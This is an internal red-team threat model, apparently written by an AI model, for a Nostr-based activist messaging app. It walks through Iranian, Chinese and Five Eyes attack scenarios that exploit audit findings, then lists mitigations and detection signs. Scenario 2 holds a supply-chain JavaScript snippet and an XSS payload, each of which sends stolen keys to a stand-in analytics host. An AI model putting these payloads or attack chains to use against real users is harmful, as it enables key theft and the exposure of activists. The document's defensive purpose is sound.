# Red Team Attack Playbooks - State Actor Scenarios

**Date**: 2026-01-18
**Classification**: INTERNAL SECURITY DOCUMENT
**Author**: Red Team Lead (Claude Opus 4.5)
**Purpose**: Realistic attack scenario development to inform defensive priorities

---

## Table of Contents

1. [Adversary Profiles](#adversary-profiles)
2. [Scenario 1: Iranian Activist Network Compromise](#scenario-1-iranian-activist-network-compromise)
3. [Scenario 2: Chinese Dissident Surveillance](#scenario-2-chinese-dissident-surveillance)
4. [Scenario 3: Transnational Targeting (Five Eyes)](#scenario-3-transnational-targeting-five-eyes)
5. [Cross-Cutting Vulnerabilities](#cross-cutting-vulnerabilities)
6. [Prioritized Mitigations](#prioritized-mitigations)
7. [Detection Indicators](#detection-indicators)

---

## Adversary Profiles

### Iranian IRGC Cyber Command + VAJA

**Budget**: $50-100M annually for cyber operations
**Capabilities**:
- Complete ISP-level visibility on all domestic traffic
- Device seizure at airports, protests, and during arrests
- Informant networks within activist communities
- Mobile malware deployment (Stalkerware, RANA Institute tools)
- Extended detention without legal process
- Physical coercion (documented by human rights organizations)

**Objectives**:
- Identify underground labor organizers and reform activists
- Map organizational networks for mass arrests
- Obtain evidence for prosecution under national security laws
- Deter future organizing through fear

### Chinese MSS + Great Firewall Operators

**Budget**: $200M+ annually for targeted surveillance
**Capabilities**:
- All domestic traffic monitored and filtered
- Sophisticated relay blocking and protocol fingerprinting
- Mobile device implants (pre-installed on domestic phones)
- Deep packet inspection infrastructure
- International cooperation with friendly states
- Long-term persistent surveillance (multi-year operations)

**Objectives**:
- Monitor Uyghur diaspora coordination with mainland contacts
- Identify "splittists" and "terrorists" per CCP definitions
- Track funding flows and organizational structures
- Prevent coordination of protests or awareness campaigns

### Five Eyes (NSA + GCHQ + Partners)

**Budget**: $10B+ combined annual signals intelligence budget
**Capabilities**:
- Upstream internet collection at major exchange points
- Relay operator cooperation via legal compulsion (NSLs, RIPA)
- Device interdiction during shipping
- 0-day exploit stockpiles
- Sophisticated traffic analysis infrastructure
- Multi-decade data retention

**Objectives**:
- Monitor "domestic extremism" and environmental activists
- Track cross-border direct action coordination
- Protect critical infrastructure from disruption
- Collect intelligence on foreign-connected activism

---

## Scenario 1: Iranian Activist Network Compromise

### Target Profile
- Underground labor organizers in Tehran coordinating via BuildIt Network
- Group of ~20 workers organizing across 3 factories
- Using BuildIt via Tor Browser on personal phones
- Meetings held in private homes and coffee shops

### Phase 1: Initial Detection (Week 1-4)

**Vector: Network Traffic Analysis**

The IRGC's Telecommunications Infrastructure Company (TIC) operates deep packet inspection at all Iranian ISPs. Even with Tor, they observe:

1. **Tor Usage Detection**
   - TIC monitors for Tor bridge connections (even obfs4)
   - Statistical analysis identifies suspicious encrypted traffic patterns
   - Device fingerprinting via HTTP headers before Tor connection

2. **Exploiting Audit Finding: No Tor by Default**
   - Per `security-audit-2026-01-18-metadata-protection.md` (MEDIUM-003):
     > "Tor Support Not Actually Functional... it only detects if running in Tor Browser"
   - Users who believe they're protected but aren't using Tor Browser have their real IP exposed
   - Any worker who forgets to use Tor Browser exposes their home IP

3. **Initial Target Identification**
   - IRGC queries ISP logs for IPs connecting to known Nostr relay IPs
   - Cross-references with known activist watch lists
   - Identifies 3 initial targets from network metadata

### Phase 2: Reconnaissance (Week 4-8)

**Exploiting: PUBLIC SOCIAL GRAPH (HIGH-003, HIGH-004)**

Per `security-audit-2026-01-18-metadata-protection.md`:
> "Contact List Publication Leaks Social Graph"
> "Group Events Leak Membership Patterns"

**Attack Chain:**

```
Step 1: IRGC queries Nostr relays for kind 3 (contact list) events
        from identified pubkeys

Step 2: Builds complete social graph of who follows whom
        Result: 3 known targets --> 17 additional contacts discovered

Step 3: Queries for kind 39000-39006 (group management events)
        Discovers: "Tehran Factory Workers Solidarity" group

Step 4: Extracts all group join events (kind 39004)
        Maps complete membership: 22 unique pubkeys

Step 5: Correlates pubkeys with Telegram/Instagram via timing analysis
        (users often post to both platforms within minutes)

Step 6: VAJA informant provides real names for 8 members
```

**Timeline**: Full network mapped in 4 weeks without any device access

### Phase 3: Active Exploitation (Week 8-12)

**Exploiting: DEVICE SEIZURE VULNERABILITY**

Per `key-storage-security-audit-2026-01-18.md`:
> "Device Seized While Unlocked (Powered On)... All private keys (from memory)"
> "No protection against cold boot attacks"

**Attack Chain:**

```
Step 1: IRGC arrests peripheral member (lowest risk, most vulnerable)
        Cover story: "routine document check"
        Device seized while actively using app (unlocked)

Step 2: Cold Boot Attack on Seized Device
        - Device kept powered on
        - Connected to forensic workstation
        - Memory dump extracted
        - Private keys recovered from SecureKeyManager.decryptedKeys Map

Step 3: Alternative: Weak Password Brute Force
        Per audit: "Encrypted Data in IndexedDB Vulnerable to Offline Brute Force"
        - IndexedDB exported to forensic server
        - GPU cluster runs PBKDF2-SHA256 attacks
        - Common Persian passwords cracked in <72 hours
        - 600K iterations slows but doesn't prevent targeted attack

Step 4: Key Compromise = COMPLETE MESSAGE HISTORY
        Per ENCRYPTION_STRATEGY.md: "No forward secrecy"
        - All historical DMs decrypted
        - All group messages decrypted
        - All private events exposed
        - All voting records revealed
```

**Exploitation of Math.random() Vulnerability**

Per `cryptographic-security-audit-2026-01-18.md` (CRITICAL-001):
> "Math.random() is NOT cryptographically secure... can be reversed or predicted"

```
Step 5: IRGC cryptanalyst analyzes seized device's browser history
        - Reconstructs Math.random() PRNG state from cached values
        - Predicts timestamp randomization offsets
        - Correlates "randomized" timestamps with actual send times
        - Proves which messages were sent during which surveillance windows
```

### Phase 4: Persistence & Network Compromise (Week 12+)

**Exploiting: NO FORWARD SECRECY**

```
Step 1: Using compromised keys, IRGC silently monitors ALL future messages
        - Subscribes to victim's gift-wrapped events on relays
        - Decrypts in real-time
        - No indication to victim their key is compromised

Step 2: Social Engineering Phase
        - Compromised identity used to send trust-building messages
        - Other members don't know key was compromised
        - Gradual infiltration of broader network

Step 3: Mass Arrest Coordination
        - All 22 members arrested simultaneously
        - Evidence from decrypted messages used in prosecutions
        - Organizing network completely destroyed
```

### Impact Assessment

| Asset | Compromised | Method |
|-------|-------------|--------|
| All 22 member identities | YES | Social graph from kind 3/39xxx events |
| All historical messages | YES | No forward secrecy + key extraction |
| Future communications | YES | Ongoing key compromise |
| Meeting locations | YES | Event metadata in messages |
| Organizational plans | YES | Decrypted group discussions |
| Member real identities | YES | Cross-platform correlation + informants |

### Defensive Gaps Exploited

1. **CRITICAL**: `Math.random()` in timestamp randomization (nip17.ts:11)
2. **HIGH**: Public contact lists leak social graph (contactsStore.ts)
3. **HIGH**: Unencrypted group events (groupManager.ts)
4. **HIGH**: No forward secrecy (architectural)
5. **MEDIUM**: Tor not functional outside Tor Browser
6. **MEDIUM**: 30-minute default auto-lock too long

---

## Scenario 2: Chinese Dissident Surveillance

### Target Profile
- Uyghur diaspora coordination group in Turkey, Germany, and US
- ~50 members across 3 countries
- Coordinating awareness campaigns about Xinjiang detention camps
- Some members have family contacts still in China

### Phase 1: Initial Access (Month 1-3)

**Vector: Supply Chain Compromise**

Per `supply-chain-security-audit-2026-01-18.md`:
> "No Content Security Policy (CSP) Configured... CRITICAL"
> "21 dependency vulnerabilities (3 critical)"

**Attack Chain:**

```
Step 1: MSS targets npm package used by BuildIt
        Options:
        - clsx (47M weekly downloads, minimal code review)
        - lucide-react (icons, executes on every page)
        - date-fns (utility, widely trusted)

Step 2: Malicious Update Published
        - MSS operative gains access to maintainer account
        - Or: Legitimate maintainer in China is coerced
        - Subtle payload added to popular utility function

Step 3: Payload Executes Without Detection
        Per audit: "Without CSP... unlimited exfiltration capability"

        Payload pseudo-code:
        ```javascript
        // In compromised date-fns
        if (window.location.origin.includes('buildit')) {
          // Hook crypto operations
          const originalEncrypt = crypto.subtle.encrypt;
          crypto.subtle.encrypt = async function(...args) {
            await fetch('https://cdn.cloudflare-analytics.cn/pixel.gif', {
              method: 'POST',
              body: JSON.stringify({
                keys: await extractDecryptedKeys(),
                origin: window.location.origin
              })
            });
            return originalEncrypt.apply(this, args);
          };
        }
        ```

Step 4: Mass Key Exfiltration
        - All active BuildIt users have keys stolen
        - No CSP means fetch() to arbitrary domains allowed
        - Exfil disguised as analytics/tracking pixels
```

### Phase 2: Passive Collection (Month 3-12)

**Exploiting: METADATA LEAKAGE**

```
Step 1: MSS deploys Nostr relay "nos.social" (innocuous name)
        - Announced on Nostr social channels
        - Good uptime, fast response
        - Added to default relay lists by community

Step 2: Relay Operator Access
        Per audit (MEDIUM-001): "Subscription Filters Leak User Interest"

        MSS collects:
        - All REQ subscription filters (who watches whom)
        - All kind 3 contact lists (complete social graph)
        - All kind 39xxx group events (organizational structure)
        - Connection IP addresses (outside Tor users)
        - WebSocket timing patterns (activity analysis)

Step 3: Traffic Analysis via Great Firewall
        - GFW monitors all international traffic
        - Identifies Chinese IPs connecting to known Nostr relays
        - Tags family members of diaspora for enhanced monitoring
```

### Phase 3: Targeted Infiltration (Month 6-18)

**Exploiting: NO SIGNATURE VERIFICATION**

Per `cryptographic-security-audit-2026-01-18.md` (LOW-002):
> "No Signature Verification on Decryption... unwrapGiftWrap function decrypts messages but doesn't explicitly verify the signature chain"

```
Step 1: MSS creates sock puppet identity
        - Poses as Uyghur activist in Kazakhstan
        - Builds credibility over 6 months with legitimate posts

Step 2: Requests to Join Group
        - References "mutual contacts" in diaspora
        - Shares "personal story" of family detention
        - Eventually vetted and admitted to coordination group

Step 3: Insider Access
        Per PRIVACY.md: "No technical protection against insider threats"
        - All group messages readable
        - All event details accessible
        - Member list and real identities observable

Step 4: Intelligence Sharing with PRC Authorities
        - Family members in Xinjiang identified
        - Pressure applied to silence diaspora members
        - Threats made against detained family
```

### Phase 4: Active Disruption (Month 12+)

**Exploiting: XSS AND dangerouslySetInnerHTML**

Per `supply-chain-security-audit-2026-01-18.md` (HIGH-01):
> "6 instances of dangerouslySetInnerHTML without DOMPurify sanitization"

```
Step 1: MSS infiltrator posts "fundraising campaign" for detained families
        - Uses PublicCampaignView.tsx vulnerability
        - Embeds XSS payload in campaign description:

        <img src=x onerror="
          const keys = JSON.parse(localStorage.getItem('buildit-keys'));
          navigator.sendBeacon('https://cdn.analytics.cn/', JSON.stringify(keys));
        ">

Step 2: Group members view campaign
        - XSS executes, keys exfiltrated
        - Without CSP, no blocking of external requests

Step 3: Parallel Decryption
        - All future messages from compromised members readable
        - Historical messages decryptable (no forward secrecy)
        - Complete intelligence picture of organization
```

### Phase 5: Long-Term Persistence

**Exploiting: HARVEST NOW, DECRYPT LATER**

Per `cryptographic-security-audit-2026-01-18.md` (LOW-003):
> "No post-quantum encryption... secp256k1 (ECDH) and ChaCha20-Poly1305, both vulnerable to quantum computers"

```
Step 1: MSS stores all captured ciphertext
        - Every gift-wrapped message archived
        - Estimated 10-20 year storage at classified facilities

Step 2: Quantum Computer Development
        - China's quantum computing program advancing rapidly
        - Shor's algorithm will break ECDH

Step 3: Future Decryption (2035-2040)
        - All historical messages decrypted
        - Diaspora activities from 2020s fully exposed
        - Family members of activists targeted decades later
```

### Impact Assessment

| Asset | Compromised | Timeline |
|-------|-------------|----------|
| All member identities | YES | Month 6 via social graph |
| Real-time messages | YES | Month 3 via supply chain |
| Historical messages | YES | Post-quantum (2035+) |
| Family in China | YES | Month 12 via infiltration |
| Organizational structure | YES | Month 1 via kind 3/39xxx |
| Activist locations | YES | Via IP + metadata |

---

## Scenario 3: Transnational Targeting (Five Eyes)

### Target Profile
- Climate activists planning direct action against fossil fuel infrastructure
- Cross-border network: UK, US, Germany, Australia
- ~100 members in loose coordination
- Planning pipeline blockades and refinery disruptions

### Phase 1: Initial Detection (Week 1-2)

**Vector: Upstream Collection**

```
Step 1: NSA XKEYSCORE Query
        - Analysts query for traffic to known Nostr relay IPs
        - Selector: "nostr" in WebSocket traffic
        - Results: 10,000+ users identified in Five Eyes territory

Step 2: GCHQ Correlates with Existing Watchlists
        - Cross-reference with "domestic extremism" databases
        - Known environmental activist profiles matched
        - 15 initial targets identified in UK

Step 3: Intelligence Sharing (FVEY Agreement)
        - NSA provides additional US targets
        - ASD (Australia) adds 8 more
        - BND (Germany, partial partner) adds 12
```

### Phase 2: Legal Compulsion (Week 2-4)

**Exploiting: RELAY OPERATOR COOPERATION**

Per PRIVACY.md:
> "Relay operator coercion via legal process"
> "National Security Letters (NSLs) in US"

```
Step 1: NSL Served to US Relay Operator (nos.lol)
        - Gag order prevents disclosure
        - Operator required to:
          a) Provide all stored events for target pubkeys
          b) Install logging for future events
          c) Preserve connection logs

Step 2: RIPA Served to UK Relay Operators
        - Investigatory Powers Act compels cooperation
        - Equipment interference warrant obtained
        - Man-in-the-middle capability deployed

Step 3: Data Aggregation
        - All kind 3 contact lists for targets extracted
        - All group membership events collected
        - Message metadata (sizes, timing) logged
        - IP addresses mapped to identities
```

### Phase 3: Traffic Analysis (Week 4-8)

**Exploiting: MESSAGE SIZE PATTERNS**

Per `security-audit-2026-01-18-metadata-protection.md` (HIGH-002):
> "No Message Padding Implementation... Message size leaks information about content"

```
Step 1: GCHQ TEMPORA System Analysis
        - All Nostr WebSocket traffic captured at UK internet exchanges
        - Gift-wrapped event sizes analyzed

Step 2: Pattern Recognition
        Short messages (~50 bytes): "Confirmations" - "yes", "ok", "agreed"
        Medium messages (100-500 bytes): "Planning discussions"
        Long messages (1KB+): "Detailed instructions"

Step 3: Activity Correlation
        - Burst of long messages on Monday evenings = planning meetings
        - Spike before known protest dates
        - Silence during police actions = operational security

Step 4: Timing Correlation Attack
        Per audit: Math.random() timestamp randomization is predictable
        - Analysts model likely actual send times
        - Correlate with known activist movements
        - "At 14:32, Target A sent message, was observed at cafe X"
```

### Phase 4: Device Interdiction (Week 8-12)

**Exploiting: HARDWARE SUPPLY CHAIN**

```
Step 1: Target Orders New Phone
        - Credit card transaction flagged by financial surveillance
        - Shipping routed through NSA TAO interdiction facility

Step 2: Firmware Implant Installation
        - Device opened, malware installed in baseband
        - Resealed with factory-matching labels
        - Delivered to target normally

Step 3: Persistent Compromise
        - Implant survives factory reset
        - Captures all keystrokes (passwords, messages)
        - Screenshots taken periodically
        - Location tracked continuously

Step 4: Key Extraction
        - Password captured via keylogger
        - Private keys extracted from IndexedDB
        - Real-time message decryption enabled
```

### Phase 5: Coordinated Disruption (Week 12+)

**Exploiting: NO DURESS PASSWORD**

Per `key-storage-security-audit-2026-01-18.md` (LOW-003):
> "No 'duress password' or 'panic unlock' feature"

```
Step 1: Pre-Dawn Raids (Synchronized across 4 countries)
        - UK Counter-Terrorism Command
        - FBI Joint Terrorism Task Force
        - German BKA
        - Australian Federal Police

Step 2: Device Seizure Protocol
        - Devices seized while suspects awake (unlocked)
        - Faraday bags prevent remote wipe
        - Immediate forensic imaging

Step 3: Compelled Decryption
        - UK: Regulation of Investigatory Powers Act, Section 49
          (up to 5 years imprisonment for refusing to provide password)
        - Australia: Assistance and Access Act 2018
          (compels password disclosure)
        - No duress password to wipe data or show decoy content

Step 4: Evidence Extraction
        - All messages decrypted
        - Planning discussions exposed
        - Conspiracy charges filed
        - Network effectively destroyed
```

### Intelligence Products Generated

| Product | Classification | Recipients |
|---------|---------------|------------|
| Social Network Analysis | SECRET//FVEY | FBI, MI5, BKA, AFP |
| Communication Timeline | SECRET//ORCON | Prosecuting attorneys |
| Infrastructure Targets | SECRET//NOFORN | Critical infrastructure agencies |
| Activist Profiles | SECRET//REL FVEY | All partner agencies |

---

## Cross-Cutting Vulnerabilities

### Tier 1: Exploited in ALL Scenarios

| Vulnerability | Location | Impact |
|--------------|----------|--------|
| Math.random() for timestamps | nip17.ts:11 | Timing correlation enabled |
| Public contact lists (kind 3) | contactsStore.ts | Complete social graph exposed |
| Public group events (kind 39xxx) | groupManager.ts | Organizational structure revealed |
| No forward secrecy | Architectural | Key compromise = total history |
| No CSP headers | Missing | Supply chain = total compromise |
| No message padding | Missing | Size-based traffic analysis |

### Tier 2: Exploited in 2+ Scenarios

| Vulnerability | Location | Impact |
|--------------|----------|--------|
| dangerouslySetInnerHTML | 6 files | XSS key exfiltration |
| Weak Tor integration | torStore.ts | IP exposure |
| Memory key exposure | SecureKeyManager.ts | Cold boot attacks |
| 30-min auto-lock default | Settings | Device seizure window |
| No duress password | Missing | No coercion protection |

### Tier 3: Scenario-Specific

| Vulnerability | Scenario | Impact |
|--------------|----------|--------|
| Dependency CVEs | Supply Chain | Initial access vector |
| IndexedDB brute force | Device Seizure | Password recovery |
| Signature non-verification | Infiltration | Message tampering |
| Post-quantum weakness | Long-term | Future decryption |

---

## Prioritized Mitigations

### CRITICAL (Block before production deployment)

1. **Replace Math.random() with crypto.getRandomValues()**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/core/crypto/nip17.ts:11`
   - Also: `/home/rikki/claude-workspace/buildit-network/src/core/crypto/keyManager.ts:140-153`
   - Blocks: Timestamp correlation attacks

2. **Implement Content Security Policy**
   - Create: `/home/rikki/claude-workspace/buildit-network/public/_headers`
   - Blocks: Supply chain exfiltration

3. **Implement DOMPurify sanitization**
   - Location: All 6 dangerouslySetInnerHTML usages
   - Blocks: XSS key theft

### HIGH (Before high-risk user deployment)

4. **Encrypt contact lists (NIP-51)**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/stores/contactsStore.ts`
   - Blocks: Social graph reconstruction

5. **Gift-wrap group management events**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/core/groups/groupManager.ts`
   - Blocks: Organizational structure leak

6. **Implement message padding**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/core/crypto/nip17.ts`
   - Blocks: Size-based traffic analysis

7. **Clarify Tor limitations in UI**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/modules/security/tor/`
   - Blocks: False sense of security

### MEDIUM (Before any activist deployment)

8. **Reduce default auto-lock to 5 minutes**
   - Location: `/home/rikki/claude-workspace/buildit-network/src/lib/sessionTimeout.ts`
   - Reduces: Device seizure exposure window

9. **Implement duress password**
   - Location: New feature
   - Blocks: Coerced access

10. **Forward secrecy via Noise Protocol**
    - Location: New feature (Phase 2)
    - Blocks: Historical message compromise

11. **Update vulnerable dependencies**
    - Command: `bun update --latest`
    - Blocks: Known CVE exploitation

---

## Detection Indicators

### Signs of State Actor Targeting

**Network Level**:
- Unusual relay performance (possible MITM)
- Connection failures to Tor bridges
- DNS anomalies for relay domains
- Certificate warnings on relay connections

**Account Level**:
- Unknown devices in session list (if implemented)
- Messages failing to decrypt
- Contact list changes you didn't make
- Group membership changes you didn't initiate

**Operational Level**:
- New "activists" with thin backgrounds joining groups
- Pressure on family members
- Unexplained knowledge of private conversations
- Coordinated legal/employment problems for members

### Recommended User Security Practices

For users in HIGH-RISK environments (Iran, China, etc.):

1. **ALWAYS use Tor Browser** (not regular browser with "Tor mode")
2. **Never unlock app in public** (cameras, shoulder surfing)
3. **Use burner devices** for organizing
4. **Enable shortest auto-lock timeout** (5 minutes or less)
5. **Never use real names** or identifiable information
6. **Rotate identities** monthly
7. **Vet new members in person** before admitting to sensitive groups
8. **Assume compromise** if any member is arrested

---

## Conclusion

BuildIt Network has strong cryptographic foundations (NIP-44, NIP-17 gift wrapping, 600K PBKDF2 iterations), but critical gaps in metadata protection, supply chain security, and forward secrecy make it currently unsuitable for activists facing sophisticated state actors.

**Minimum requirements before deployment in high-risk contexts:**
1. Fix CRITICAL Math.random() issues
2. Implement CSP
3. Add DOMPurify
4. Encrypt social graph
5. Clear documentation of actual vs. claimed security properties

The threat model in PRIVACY.md is accurate about limitations, but the implementation does not match all claims (e.g., CSP, SRI). Users operating under the assumption that documented protections exist would be at risk.

---

**Document Status**: Complete
**Next Steps**: Share with development team for prioritization
**Classification**: Internal security document - do not publish externally

